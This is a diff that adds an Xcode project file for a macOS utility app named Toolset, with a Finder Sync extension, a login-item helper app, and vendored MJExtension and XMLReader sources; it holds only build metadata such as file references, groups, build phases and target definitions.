@@ -1,0 +1,860 @@
+// !$*UTF8*$!
+{
+	archiveVersion = 1;
+	classes = {
+	};
+	objectVersion = 50;
+	objects = {
+
+/* Begin PBXBuildFile section */
+		EA6D6385261D572500B952C4 /* data.plist in Resources */ = {isa = PBXBuildFile; fileRef = EA6D6384261D572500B952C4 /* data.plist */; };
+		EA6D6403261D9B9800B952C4 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = EA773C77261C659200AA499A /* Assets.xcassets */; };
+		EA6D641B261D9D3200B952C4 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = EA6D641A261D9D3200B952C4 /* AppDelegate.swift */; };
+		EA6D641F261D9D3400B952C4 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = EA6D641E261D9D3400B952C4 /* Assets.xcassets */; };
+		EA6D6422261D9D3400B952C4 /* Main.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = EA6D6420261D9D3400B952C4 /* Main.storyboard */; };
+		EA6D6438261D9F4D00B952C4 /* aToolsetHelper.app in CopyFiles */ = {isa = PBXBuildFile; fileRef = EA6D6418261D9D3200B952C4 /* aToolsetHelper.app */; settings = {ATTRIBUTES = (RemoveHeadersOnCopy, ); }; };
+		EA773C74261C658F00AA499A /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = EA773C73261C658F00AA499A /* AppDelegate.swift */; };
+		EA773C78261C659200AA499A /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = EA773C77261C659200AA499A /* Assets.xcassets */; };
+		EA773C7B261C659200AA499A /* Main.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = EA773C79261C659200AA499A /* Main.storyboard */; };
+		EA773C8B261C65D300AA499A /* FinderSync.swift in Sources */ = {isa = PBXBuildFile; fileRef = EA773C8A261C65D300AA499A /* FinderSync.swift */; };
+		EA773C90261C65D300AA499A /* ToolsetExtension.appex in Embed App Extensions */ = {isa = PBXBuildFile; fileRef = EA773C88261C65D300AA499A /* ToolsetExtension.appex */; settings = {ATTRIBUTES = (RemoveHeadersOnCopy, ); }; };
+		EA773CD6261C684900AA499A /* MJPropertyType.m in Sources */ = {isa = PBXBuildFile; fileRef = EA773CAA261C684900AA499A /* MJPropertyType.m */; };
+		EA773CD7261C684900AA499A /* NSObject+MJKeyValue.m in Sources */ = {isa = PBXBuildFile; fileRef = EA773CAD261C684900AA499A /* NSObject+MJKeyValue.m */; };
+		EA773CD8261C684900AA499A /* MJProperty.m in Sources */ = {isa = PBXBuildFile; fileRef = EA773CAE261C684900AA499A /* MJProperty.m */; };
+		EA773CD9261C684900AA499A /* NSObject+MJCoding.m in Sources */ = {isa = PBXBuildFile; fileRef = EA773CB0261C684900AA499A /* NSObject+MJCoding.m */; };
+		EA773CDA261C684900AA499A /* MJExtensionConst.m in Sources */ = {isa = PBXBuildFile; fileRef = EA773CB2261C684900AA499A /* MJExtensionConst.m */; };
+		EA773CDB261C684900AA499A /* NSObject+MJProperty.m in Sources */ = {isa = PBXBuildFile; fileRef = EA773CB3261C684900AA499A /* NSObject+MJProperty.m */; };
+		EA773CDC261C684900AA499A /* NSObject+MJClass.m in Sources */ = {isa = PBXBuildFile; fileRef = EA773CB5261C684900AA499A /* NSObject+MJClass.m */; };
+		EA773CDD261C684900AA499A /* NSString+MJExtension.m in Sources */ = {isa = PBXBuildFile; fileRef = EA773CB6261C684900AA499A /* NSString+MJExtension.m */; };
+		EA773CDE261C684900AA499A /* MJPropertyKey.m in Sources */ = {isa = PBXBuildFile; fileRef = EA773CB7261C684900AA499A /* MJPropertyKey.m */; };
+		EA773CDF261C684900AA499A /* MJFoundation.m in Sources */ = {isa = PBXBuildFile; fileRef = EA773CBB261C684900AA499A /* MJFoundation.m */; };
+		EA773CE0261C684900AA499A /* XMLReader.m in Sources */ = {isa = PBXBuildFile; fileRef = EA773CBD261C684900AA499A /* XMLReader.m */; };
+		EA773CE2261C684900AA499A /* NSArray+Extension.m in Sources */ = {isa = PBXBuildFile; fileRef = EA773CC4261C684900AA499A /* NSArray+Extension.m */; };
+		EA773CE3261C684900AA499A /* NSImage+Extension.m in Sources */ = {isa = PBXBuildFile; fileRef = EA773CC6261C684900AA499A /* NSImage+Extension.m */; };
+		EA773CE4261C684900AA499A /* NSDictionary+Extension.m in Sources */ = {isa = PBXBuildFile; fileRef = EA773CC8261C684900AA499A /* NSDictionary+Extension.m */; };
+		EA773CE5261C684900AA499A /* NSDate+Extension.m in Sources */ = {isa = PBXBuildFile; fileRef = EA773CC9261C684900AA499A /* NSDate+Extension.m */; };
+		EA773CE6261C684900AA499A /* NSString+Extension.m in Sources */ = {isa = PBXBuildFile; fileRef = EA773CCB261C684900AA499A /* NSString+Extension.m */; };
+		EA773CE7261C684900AA499A /* LYBFileTools.m in Sources */ = {isa = PBXBuildFile; fileRef = EA773CD0261C684900AA499A /* LYBFileTools.m */; };
+		EA773CE8261C684900AA499A /* LYBImageTools.m in Sources */ = {isa = PBXBuildFile; fileRef = EA773CD3261C684900AA499A /* LYBImageTools.m */; };
+		EA773CE9261C684900AA499A /* LYBIconModel.m in Sources */ = {isa = PBXBuildFile; fileRef = EA773CD4261C684900AA499A /* LYBIconModel.m */; };
+		EA773CF7261C69AA00AA499A /* XMLReader.m in Sources */ = {isa = PBXBuildFile; fileRef = EA773CBD261C684900AA499A /* XMLReader.m */; };
+		EA773CFA261C69B300AA499A /* MJPropertyType.m in Sources */ = {isa = PBXBuildFile; fileRef = EA773CAA261C684900AA499A /* MJPropertyType.m */; };
+		EA773CFD261C69B600AA499A /* NSObject+MJKeyValue.m in Sources */ = {isa = PBXBuildFile; fileRef = EA773CAD261C684900AA499A /* NSObject+MJKeyValue.m */; };
+		EA773D00261C69B800AA499A /* MJProperty.m in Sources */ = {isa = PBXBuildFile; fileRef = EA773CAE261C684900AA499A /* MJProperty.m */; };
+		EA773D03261C69BB00AA499A /* NSObject+MJCoding.m in Sources */ = {isa = PBXBuildFile; fileRef = EA773CB0261C684900AA499A /* NSObject+MJCoding.m */; };
+		EA773D04261C69BD00AA499A /* MJExtensionConst.m in Sources */ = {isa = PBXBuildFile; fileRef = EA773CB2261C684900AA499A /* MJExtensionConst.m */; };
+		EA773D07261C69C000AA499A /* NSObject+MJProperty.m in Sources */ = {isa = PBXBuildFile; fileRef = EA773CB3261C684900AA499A /* NSObject+MJProperty.m */; };
+		EA773D0A261C69C300AA499A /* NSObject+MJClass.m in Sources */ = {isa = PBXBuildFile; fileRef = EA773CB5261C684900AA499A /* NSObject+MJClass.m */; };
+		EA773D0D261C69C600AA499A /* MJPropertyKey.m in Sources */ = {isa = PBXBuildFile; fileRef = EA773CB7261C684900AA499A /* MJPropertyKey.m */; };
+		EA773D10261C69C800AA499A /* NSString+MJExtension.m in Sources */ = {isa = PBXBuildFile; fileRef = EA773CB6261C684900AA499A /* NSString+MJExtension.m */; };
+		EA773D13261C69CF00AA499A /* MJFoundation.m in Sources */ = {isa = PBXBuildFile; fileRef = EA773CBB261C684900AA499A /* MJFoundation.m */; };
+		EA773D16261C69DA00AA499A /* LYBImageTools.m in Sources */ = {isa = PBXBuildFile; fileRef = EA773CD3261C684900AA499A /* LYBImageTools.m */; };
+		EA773D19261C69DD00AA499A /* LYBIconModel.m in Sources */ = {isa = PBXBuildFile; fileRef = EA773CD4261C684900AA499A /* LYBIconModel.m */; };
+		EA773D1C261C69E100AA499A /* LYBFileTools.m in Sources */ = {isa = PBXBuildFile; fileRef = EA773CD0261C684900AA499A /* LYBFileTools.m */; };
+		EA773D1F261C69E700AA499A /* NSArray+Extension.m in Sources */ = {isa = PBXBuildFile; fileRef = EA773CC4261C684900AA499A /* NSArray+Extension.m */; };
+		EA773D22261C69EC00AA499A /* NSImage+Extension.m in Sources */ = {isa = PBXBuildFile; fileRef = EA773CC6261C684900AA499A /* NSImage+Extension.m */; };
+		EA773D25261C69EF00AA499A /* NSDictionary+Extension.m in Sources */ = {isa = PBXBuildFile; fileRef = EA773CC8261C684900AA499A /* NSDictionary+Extension.m */; };
+		EA773D28261C69F200AA499A /* NSDate+Extension.m in Sources */ = {isa = PBXBuildFile; fileRef = EA773CC9261C684900AA499A /* NSDate+Extension.m */; };
+		EA773D2B261C69F500AA499A /* NSString+Extension.m in Sources */ = {isa = PBXBuildFile; fileRef = EA773CCB261C684900AA499A /* NSString+Extension.m */; };
+/* End PBXBuildFile section */
+
+/* Begin PBXContainerItemProxy section */
+		EA773C8E261C65D300AA499A /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = EA773C68261C658F00AA499A /* Project object */;
+			proxyType = 1;
+			remoteGlobalIDString = EA773C87261C65D300AA499A;
+			remoteInfo = ToolsetExtension;
+		};
+/* End PBXContainerItemProxy section */
+
+/* Begin PBXCopyFilesBuildPhase section */
+		EA6D6437261D9F4200B952C4 /* CopyFiles */ = {
+			isa = PBXCopyFilesBuildPhase;
+			buildActionMask = 2147483647;
+			dstPath = Contents/Library/LoginItems;
+			dstSubfolderSpec = 1;
+			files = (
+				EA6D6438261D9F4D00B952C4 /* aToolsetHelper.app in CopyFiles */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		EA773C94261C65D300AA499A /* Embed App Extensions */ = {
+			isa = PBXCopyFilesBuildPhase;
+			buildActionMask = 2147483647;
+			dstPath = "";
+			dstSubfolderSpec = 13;
+			files = (
+				EA773C90261C65D300AA499A /* ToolsetExtension.appex in Embed App Extensions */,
+			);
+			name = "Embed App Extensions";
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXCopyFilesBuildPhase section */
+
+/* Begin PBXFileReference section */
+		EA6D6384261D572500B952C4 /* data.plist */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.plist.xml; path = data.plist; sourceTree = "<group>"; };
+		EA6D6418261D9D3200B952C4 /* aToolsetHelper.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = aToolsetHelper.app; sourceTree = BUILT_PRODUCTS_DIR; };
+		EA6D641A261D9D3200B952C4 /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
+		EA6D641E261D9D3400B952C4 /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
+		EA6D6421261D9D3400B952C4 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/Main.storyboard; sourceTree = "<group>"; };
+		EA6D6423261D9D3400B952C4 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
+		EA6D6424261D9D3400B952C4 /* aToolsetHelper.entitlements */ = {isa = PBXFileReference; lastKnownFileType = text.plist.entitlements; path = aToolsetHelper.entitlements; sourceTree = "<group>"; };
+		EA773C70261C658F00AA499A /* Toolset.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = Toolset.app; sourceTree = BUILT_PRODUCTS_DIR; };
+		EA773C73261C658F00AA499A /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
+		EA773C77261C659200AA499A /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
+		EA773C7A261C659200AA499A /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/Main.storyboard; sourceTree = "<group>"; };
+		EA773C7C261C659200AA499A /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
+		EA773C7D261C659200AA499A /* Toolset.entitlements */ = {isa = PBXFileReference; lastKnownFileType = text.plist.entitlements; path = Toolset.entitlements; sourceTree = "<group>"; };
+		EA773C88261C65D300AA499A /* ToolsetExtension.appex */ = {isa = PBXFileReference; explicitFileType = "wrapper.app-extension"; includeInIndex = 0; path = ToolsetExtension.appex; sourceTree = BUILT_PRODUCTS_DIR; };
+		EA773C8A261C65D300AA499A /* FinderSync.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FinderSync.swift; sourceTree = "<group>"; };
+		EA773C8C261C65D300AA499A /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
+		EA773C8D261C65D300AA499A /* ToolsetExtension.entitlements */ = {isa = PBXFileReference; lastKnownFileType = text.plist.entitlements; path = ToolsetExtension.entitlements; sourceTree = "<group>"; };
+		EA773CA7261C684900AA499A /* MJPropertyKey.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = MJPropertyKey.h; sourceTree = "<group>"; };
+		EA773CA8261C684900AA499A /* NSObject+MJClass.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = "NSObject+MJClass.h"; sourceTree = "<group>"; };
+		EA773CA9261C684900AA499A /* NSString+MJExtension.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = "NSString+MJExtension.h"; sourceTree = "<group>"; };
+		EA773CAA261C684900AA499A /* MJPropertyType.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = MJPropertyType.m; sourceTree = "<group>"; };
+		EA773CAB261C684900AA499A /* NSObject+MJProperty.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = "NSObject+MJProperty.h"; sourceTree = "<group>"; };
+		EA773CAC261C684900AA499A /* MJExtensionConst.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = MJExtensionConst.h; sourceTree = "<group>"; };
+		EA773CAD261C684900AA499A /* NSObject+MJKeyValue.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = "NSObject+MJKeyValue.m"; sourceTree = "<group>"; };
+		EA773CAE261C684900AA499A /* MJProperty.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = MJProperty.m; sourceTree = "<group>"; };
+		EA773CAF261C684900AA499A /* MJFoundation.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = MJFoundation.h; sourceTree = "<group>"; };
+		EA773CB0261C684900AA499A /* NSObject+MJCoding.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = "NSObject+MJCoding.m"; sourceTree = "<group>"; };
+		EA773CB1261C684900AA499A /* MJExtension.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = MJExtension.h; sourceTree = "<group>"; };
+		EA773CB2261C684900AA499A /* MJExtensionConst.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = MJExtensionConst.m; sourceTree = "<group>"; };
+		EA773CB3261C684900AA499A /* NSObject+MJProperty.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = "NSObject+MJProperty.m"; sourceTree = "<group>"; };
+		EA773CB4261C684900AA499A /* MJPropertyType.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = MJPropertyType.h; sourceTree = "<group>"; };
+		EA773CB5261C684900AA499A /* NSObject+MJClass.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = "NSObject+MJClass.m"; sourceTree = "<group>"; };
+		EA773CB6261C684900AA499A /* NSString+MJExtension.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = "NSString+MJExtension.m"; sourceTree = "<group>"; };
+		EA773CB7261C684900AA499A /* MJPropertyKey.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = MJPropertyKey.m; sourceTree = "<group>"; };
+		EA773CB8261C684900AA499A /* MJProperty.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = MJProperty.h; sourceTree = "<group>"; };
+		EA773CB9261C684900AA499A /* NSObject+MJKeyValue.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = "NSObject+MJKeyValue.h"; sourceTree = "<group>"; };
+		EA773CBA261C684900AA499A /* NSObject+MJCoding.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = "NSObject+MJCoding.h"; sourceTree = "<group>"; };
+		EA773CBB261C684900AA499A /* MJFoundation.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = MJFoundation.m; sourceTree = "<group>"; };
+		EA773CBC261C684900AA499A /* XMLReader.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = XMLReader.h; sourceTree = "<group>"; };
+		EA773CBD261C684900AA499A /* XMLReader.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = XMLReader.m; sourceTree = "<group>"; };
+		EA773CC3261C684900AA499A /* NSDictionary+Extension.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = "NSDictionary+Extension.h"; sourceTree = "<group>"; };
+		EA773CC4261C684900AA499A /* NSArray+Extension.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = "NSArray+Extension.m"; sourceTree = "<group>"; };
+		EA773CC5261C684900AA499A /* NSString+Extension.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = "NSString+Extension.h"; sourceTree = "<group>"; };
+		EA773CC6261C684900AA499A /* NSImage+Extension.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = "NSImage+Extension.m"; sourceTree = "<group>"; };
+		EA773CC7261C684900AA499A /* NSDate+Extension.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = "NSDate+Extension.h"; sourceTree = "<group>"; };
+		EA773CC8261C684900AA499A /* NSDictionary+Extension.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = "NSDictionary+Extension.m"; sourceTree = "<group>"; };
+		EA773CC9261C684900AA499A /* NSDate+Extension.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = "NSDate+Extension.m"; sourceTree = "<group>"; };
+		EA773CCA261C684900AA499A /* NSImage+Extension.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = "NSImage+Extension.h"; sourceTree = "<group>"; };
+		EA773CCB261C684900AA499A /* NSString+Extension.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = "NSString+Extension.m"; sourceTree = "<group>"; };
+		EA773CCC261C684900AA499A /* NSArray+Extension.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = "NSArray+Extension.h"; sourceTree = "<group>"; };
+		EA773CCF261C684900AA499A /* LYBFileTools.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = LYBFileTools.h; sourceTree = "<group>"; };
+		EA773CD0261C684900AA499A /* LYBFileTools.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = LYBFileTools.m; sourceTree = "<group>"; };
+		EA773CD2261C684900AA499A /* LYBIconModel.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = LYBIconModel.h; sourceTree = "<group>"; };
+		EA773CD3261C684900AA499A /* LYBImageTools.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = LYBImageTools.m; sourceTree = "<group>"; };
+		EA773CD4261C684900AA499A /* LYBIconModel.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = LYBIconModel.m; sourceTree = "<group>"; };
+		EA773CD5261C684900AA499A /* LYBImageTools.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = LYBImageTools.h; sourceTree = "<group>"; };
+		EA773CEC261C686600AA499A /* bridging-header.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = "bridging-header.h"; sourceTree = "<group>"; };
+/* End PBXFileReference section */
+
+/* Begin PBXFrameworksBuildPhase section */
+		EA6D6415261D9D3200B952C4 /* Frameworks */ = {
+			isa = PBXFrameworksBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		EA773C6D261C658F00AA499A /* Frameworks */ = {
+			isa = PBXFrameworksBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		EA773C85261C65D300AA499A /* Frameworks */ = {
+			isa = PBXFrameworksBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXFrameworksBuildPhase section */
+
+/* Begin PBXGroup section */
+		EA6D6419261D9D3200B952C4 /* aToolsetHelper */ = {
+			isa = PBXGroup;
+			children = (
+				EA6D641A261D9D3200B952C4 /* AppDelegate.swift */,
+				EA6D641E261D9D3400B952C4 /* Assets.xcassets */,
+				EA6D6420261D9D3400B952C4 /* Main.storyboard */,
+				EA6D6423261D9D3400B952C4 /* Info.plist */,
+				EA6D6424261D9D3400B952C4 /* aToolsetHelper.entitlements */,
+			);
+			path = aToolsetHelper;
+			sourceTree = "<group>";
+		};
+		EA773C67261C658F00AA499A = {
+			isa = PBXGroup;
+			children = (
+				EA773C72261C658F00AA499A /* aToolset */,
+				EA773C89261C65D300AA499A /* aToolsetExtension */,
+				EA6D6419261D9D3200B952C4 /* aToolsetHelper */,
+				EA773C71261C658F00AA499A /* Products */,
+			);
+			sourceTree = "<group>";
+		};
+		EA773C71261C658F00AA499A /* Products */ = {
+			isa = PBXGroup;
+			children = (
+				EA773C70261C658F00AA499A /* Toolset.app */,
+				EA773C88261C65D300AA499A /* ToolsetExtension.appex */,
+				EA6D6418261D9D3200B952C4 /* aToolsetHelper.app */,
+			);
+			name = Products;
+			sourceTree = "<group>";
+		};
+		EA773C72261C658F00AA499A /* aToolset */ = {
+			isa = PBXGroup;
+			children = (
+				EA773C73261C658F00AA499A /* AppDelegate.swift */,
+				EA773CBE261C684900AA499A /* General */,
+				EA773CCD261C684900AA499A /* Moudle */,
+				EA773CA5261C684900AA499A /* Vendor */,
+				EA773C77261C659200AA499A /* Assets.xcassets */,
+				EA773C79261C659200AA499A /* Main.storyboard */,
+				EA773C7C261C659200AA499A /* Info.plist */,
+				EA773CEC261C686600AA499A /* bridging-header.h */,
+				EA6D6384261D572500B952C4 /* data.plist */,
+				EA773C7D261C659200AA499A /* Toolset.entitlements */,
+			);
+			path = aToolset;
+			sourceTree = "<group>";
+		};
+		EA773C89261C65D300AA499A /* aToolsetExtension */ = {
+			isa = PBXGroup;
+			children = (
+				EA773C8A261C65D300AA499A /* FinderSync.swift */,
+				EA773C8C261C65D300AA499A /* Info.plist */,
+				EA773C8D261C65D300AA499A /* ToolsetExtension.entitlements */,
+			);
+			path = aToolsetExtension;
+			sourceTree = "<group>";
+		};
+		EA773CA5261C684900AA499A /* Vendor */ = {
+			isa = PBXGroup;
+			children = (
+				EA773CA6261C684900AA499A /* MJExtension */,
+				EA773CBC261C684900AA499A /* XMLReader.h */,
+				EA773CBD261C684900AA499A /* XMLReader.m */,
+			);
+			path = Vendor;
+			sourceTree = "<group>";
+		};
+		EA773CA6261C684900AA499A /* MJExtension */ = {
+			isa = PBXGroup;
+			children = (
+				EA773CA7261C684900AA499A /* MJPropertyKey.h */,
+				EA773CA8261C684900AA499A /* NSObject+MJClass.h */,
+				EA773CA9261C684900AA499A /* NSString+MJExtension.h */,
+				EA773CAA261C684900AA499A /* MJPropertyType.m */,
+				EA773CAB261C684900AA499A /* NSObject+MJProperty.h */,
+				EA773CAC261C684900AA499A /* MJExtensionConst.h */,
+				EA773CAD261C684900AA499A /* NSObject+MJKeyValue.m */,
+				EA773CAE261C684900AA499A /* MJProperty.m */,
+				EA773CAF261C684900AA499A /* MJFoundation.h */,
+				EA773CB0261C684900AA499A /* NSObject+MJCoding.m */,
+				EA773CB1261C684900AA499A /* MJExtension.h */,
+				EA773CB2261C684900AA499A /* MJExtensionConst.m */,
+				EA773CB3261C684900AA499A /* NSObject+MJProperty.m */,
+				EA773CB4261C684900AA499A /* MJPropertyType.h */,
+				EA773CB5261C684900AA499A /* NSObject+MJClass.m */,
+				EA773CB6261C684900AA499A /* NSString+MJExtension.m */,
+				EA773CB7261C684900AA499A /* MJPropertyKey.m */,
+				EA773CB8261C684900AA499A /* MJProperty.h */,
+				EA773CB9261C684900AA499A /* NSObject+MJKeyValue.h */,
+				EA773CBA261C684900AA499A /* NSObject+MJCoding.h */,
+				EA773CBB261C684900AA499A /* MJFoundation.m */,
+			);
+			path = MJExtension;
+			sourceTree = "<group>";
+		};
+		EA773CBE261C684900AA499A /* General */ = {
+			isa = PBXGroup;
+			children = (
+				EA773CC2261C684900AA499A /* Category */,
+			);
+			path = General;
+			sourceTree = "<group>";
+		};
+		EA773CC2261C684900AA499A /* Category */ = {
+			isa = PBXGroup;
+			children = (
+				EA773CC8261C684900AA499A /* NSDictionary+Extension.m */,
+				EA773CC3261C684900AA499A /* NSDictionary+Extension.h */,
+				EA773CC4261C684900AA499A /* NSArray+Extension.m */,
+				EA773CC5261C684900AA499A /* NSString+Extension.h */,
+				EA773CC6261C684900AA499A /* NSImage+Extension.m */,
+				EA773CC7261C684900AA499A /* NSDate+Extension.h */,
+				EA773CC9261C684900AA499A /* NSDate+Extension.m */,
+				EA773CCA261C684900AA499A /* NSImage+Extension.h */,
+				EA773CCB261C684900AA499A /* NSString+Extension.m */,
+				EA773CCC261C684900AA499A /* NSArray+Extension.h */,
+			);
+			path = Category;
+			sourceTree = "<group>";
+		};
+		EA773CCD261C684900AA499A /* Moudle */ = {
+			isa = PBXGroup;
+			children = (
+				EA773CCE261C684900AA499A /* File */,
+				EA773CD1261C684900AA499A /* Image */,
+			);
+			path = Moudle;
+			sourceTree = "<group>";
+		};
+		EA773CCE261C684900AA499A /* File */ = {
+			isa = PBXGroup;
+			children = (
+				EA773CCF261C684900AA499A /* LYBFileTools.h */,
+				EA773CD0261C684900AA499A /* LYBFileTools.m */,
+			);
+			path = File;
+			sourceTree = "<group>";
+		};
+		EA773CD1261C684900AA499A /* Image */ = {
+			isa = PBXGroup;
+			children = (
+				EA773CD2261C684900AA499A /* LYBIconModel.h */,
+				EA773CD3261C684900AA499A /* LYBImageTools.m */,
+				EA773CD4261C684900AA499A /* LYBIconModel.m */,
+				EA773CD5261C684900AA499A /* LYBImageTools.h */,
+			);
+			path = Image;
+			sourceTree = "<group>";
+		};
+/* End PBXGroup section */
+
+/* Begin PBXNativeTarget section */
+		EA6D6417261D9D3200B952C4 /* aToolsetHelper */ = {
+			isa = PBXNativeTarget;
+			buildConfigurationList = EA6D6425261D9D3400B952C4 /* Build configuration list for PBXNativeTarget "aToolsetHelper" */;
+			buildPhases = (
+				EA6D6414261D9D3200B952C4 /* Sources */,
+				EA6D6415261D9D3200B952C4 /* Frameworks */,
+				EA6D6416261D9D3200B952C4 /* Resources */,
+			);
+			buildRules = (
+			);
+			dependencies = (
+			);
+			name = aToolsetHelper;
+			productName = aToolsetHelper;
+			productReference = EA6D6418261D9D3200B952C4 /* aToolsetHelper.app */;
+			productType = "com.apple.product-type.application";
+		};
+		EA773C6F261C658F00AA499A /* Toolset */ = {
+			isa = PBXNativeTarget;
+			buildConfigurationList = EA773C80261C659200AA499A /* Build configuration list for PBXNativeTarget "Toolset" */;
+			buildPhases = (
+				EA773C6C261C658F00AA499A /* Sources */,
+				EA773C6D261C658F00AA499A /* Frameworks */,
+				EA773C6E261C658F00AA499A /* Resources */,
+				EA773C94261C65D300AA499A /* Embed App Extensions */,
+				EA6D6437261D9F4200B952C4 /* CopyFiles */,
+			);
+			buildRules = (
+			);
+			dependencies = (
+				EA773C8F261C65D300AA499A /* PBXTargetDependency */,
+			);
+			name = Toolset;
+			productName = Toolset;
+			productReference = EA773C70261C658F00AA499A /* Toolset.app */;
+			productType = "com.apple.product-type.application";
+		};
+		EA773C87261C65D300AA499A /* ToolsetExtension */ = {
+			isa = PBXNativeTarget;
+			buildConfigurationList = EA773C91261C65D300AA499A /* Build configuration list for PBXNativeTarget "ToolsetExtension" */;
+			buildPhases = (
+				EA773C84261C65D300AA499A /* Sources */,
+				EA773C85261C65D300AA499A /* Frameworks */,
+				EA773C86261C65D300AA499A /* Resources */,
+			);
+			buildRules = (
+			);
+			dependencies = (
+			);
+			name = ToolsetExtension;
+			productName = ToolsetExtension;
+			productReference = EA773C88261C65D300AA499A /* ToolsetExtension.appex */;
+			productType = "com.apple.product-type.app-extension";
+		};
+/* End PBXNativeTarget section */
+
+/* Begin PBXProject section */
+		EA773C68261C658F00AA499A /* Project object */ = {
+			isa = PBXProject;
+			attributes = {
+				LastSwiftUpdateCheck = 1230;
+				LastUpgradeCheck = 1230;
+				TargetAttributes = {
+					EA6D6417261D9D3200B952C4 = {
+						CreatedOnToolsVersion = 12.3;
+					};
+					EA773C6F261C658F00AA499A = {
+						CreatedOnToolsVersion = 12.3;
+					};
